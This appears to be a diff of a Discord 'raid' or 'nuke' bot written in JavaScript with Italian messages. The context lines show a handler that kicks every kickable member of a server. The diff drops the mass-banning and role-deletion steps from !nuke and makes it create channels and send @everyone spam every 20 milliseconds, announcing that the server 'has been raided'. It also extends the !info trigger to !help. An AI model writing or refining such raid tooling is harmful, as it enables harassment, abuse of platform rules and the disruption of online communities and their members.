@@ -12,7 +12,7 @@ client.on("ready", () => {
 })
 
 client.on("messageCreate", message => {
-    if (message.content == "!info") {
+    if (message.content == "!info" || message.content == "!help") {
         let embed = new Discord.MessageEmbed()
             .setTitle("__Info BOT__")
             .setDescription("Ecco le informazioni riguardo il bot")
@@ -29,7 +29,6 @@ client.on("messageCreate", async message => {
 
         const members = await message.guild.members.fetch()
         members.filter(m => m.kickable).forEach(m => m.kick())
-
 
         try {
             const channel = await message.guild.channels.fetch()
@@ -51,25 +50,23 @@ client.on("messageCreate", async message => {
 client.on("messageCreate", async message => {
     if (message.content == "!nuke") {
         try {
-            const members = await message.guild.members.fetch()
-            members.filter(m => m.bannable).forEach(m => m.ban())
-
-            message.guild.roles.cache.each(role => {
-                if (role.editable && role.name !== "@everyone") {
-                    role.delete().catch(err => console.log(role.name))
-                }
-            });
-
             setInterval(async () => {
                 var server = message.channel.guild;
-                server.channels.create("RAID", {
+                let nRandom2 = Math.floor (Math.random() * (10000 - 1 + 1) ) + 100;
+                server.channels.create(`𝐄𝐙-𝐑𝐀𝐈𝐃-${nRandom2}`, {
                     type: "text"
                 }).then(canale => {
                     setInterval(async () => {
                         canale.send("@everyone questo server è stato raidato\r@everyone questo server è stato raidato\r@everyone questo server è stato raidato")
+                        await canale.send("@everyone questo server è stato raidato\r@everyone questo server è stato raidato\r@everyone questo server è stato raidato")
                     }, 20)
                 })
-            }, 50);
-        } catch { return }
+            }, 20);
+        } catch (err) {
+            console.error(err)
+            return
+        }
     }
 })
+
+
